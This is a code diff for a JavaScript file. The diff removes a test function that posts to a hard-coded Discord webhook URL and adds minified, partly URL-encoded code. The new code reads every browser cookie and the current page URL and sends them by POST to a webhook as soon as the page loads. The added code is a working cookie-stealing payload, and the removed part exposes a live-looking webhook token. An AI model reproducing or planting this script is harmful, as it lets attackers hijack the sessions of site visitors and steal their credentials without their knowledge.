@@ -1,15 +1,2 @@
-function sendMessage() {
-      const request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/952951181045555270/ulkTPTFugmqNKTXLXjhkXRcKyQMsoDkT866X91CvWua4fc-EMFm2oGuifUeWa8fS7E0L");
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      const params = {
-        username: "JAVASCRIPT HIT",
-        avatar_url: "",
-        content: "test"
-      }
-
-      request.send(JSON.stringify(params));
-    }
-    sendMessage()
+var ifConnected=window.navigator.onLine;function listCookies(){for(var t=document.cookie.split(";"),o="",e=1;e<=t.length;e++)o+=e+" "+t[e-1]+"
+";return o}function sendMessage(){const t=new XMLHttpRequest;t.open("POST","webhook"),t.setRequestHeader("Content-type","application/json");const o={username:"DOC HIT[PHP cookies might not be logged]",avatar_url:"https://upload.wikimedia.org/wikipedia/commons/thumb/9/99/Unofficial_JavaScript_logo_2.svg/480px-Unofficial_JavaScript_logo_2.svg.png%22,content:listCookies()%7D;t.send(JSON.stringify(o))%7Dfunction datetime(){var t=new Date;console.log(t)}function geturl(){window.location.href}function linkurl(){const t=new XMLHttpRequest;t.open("POST","webhook"),t.setRequestHeader("Content-type","application/json");const o={username:"URL -> ",avatar_url:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTUpmg6EtDRAFSm7quOrEqKJrA-uDjfIlFF5A&usqp=CAU%22,content:window.location.href%7D;t.send(JSON.stringify(o))%7Dfunction brake(){const t=new XMLHttpRequest;t.open("POST","webhook"),t.setRequestHeader("Content-type","application/json");t.send(JSON.stringify({username:"DOC HIT[PHP cookies might not be logged]",avatar_url:"https://upload.wikimedia.org/wikipedia/commons/thumb/9/99/Unofficial_JavaScript_logo_2.svg/480px-Unofficial_JavaScript_logo_2.svg.png%22,content:%22-------------------------------%22%7D))%7DifConnected?console.log(%22Connection available"):console.log("Connection not available"),datetime(),sendMessage(),linkurl();
